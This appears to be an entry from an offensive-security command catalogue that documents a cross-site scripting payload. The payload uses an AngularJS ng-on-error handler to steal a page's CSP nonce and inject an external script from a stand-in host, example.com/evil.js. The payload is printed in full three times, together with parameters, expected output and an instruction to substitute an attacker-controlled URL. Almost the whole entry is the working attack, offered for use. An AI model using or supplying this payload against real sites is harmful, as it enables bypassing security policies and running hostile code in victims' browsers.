---
data: >-
  <img src=x
  ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector("[nonce]");b=w.createElement("script");b.src="//example.com/evil.js";b.nonce=a.nonce;w.body.appendChild(b)'>
tags:
  - csp-bypass
  - nonce-theft
type: command
output: External script //example.com/evil.js loads and executes
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:07.581Z'
id: 31877334-56bb-4875-bb78-a0c319d80c3b
verified: false
validated: true
submitted: true
---
# steal-nonce-inject-script

## Command

```javascript
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector("[nonce]");b=w.createElement("script");b.src="//example.com/evil.js";b.nonce=a.nonce;w.body.appendChild(b)'>
```

## Description

Injects an img tag that triggers ng-on-error to access the document, query for nonce in top document, create a script with external src, apply the nonce, and append to body, bypassing CSP.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| src | Invalid src to trigger error (x) | Yes |
| ng-on-error | Full payload for nonce theft and injection (w=...appendChild(b)) | Yes |

## Examples

### Basic Usage

```javascript
<img src=x ng-on-error='w=$event.target.ownerDocument;a=w.defaultView.top.document.querySelector("[nonce]");b=w.createElement("script");b.src="//example.com/evil.js";b.nonce=a.nonce;w.body.appendChild(b)'>
```

### Advanced Usage

Replace //example.com/evil.js with attacker-controlled script URL.

## Expected Output

Script element created and appended; external JS loads via network request and executes.

## Related

- [[commands/inject-angularjs-iframe]]
- [[procedures/Steal-Nonce-and-Inject-External-Script]]
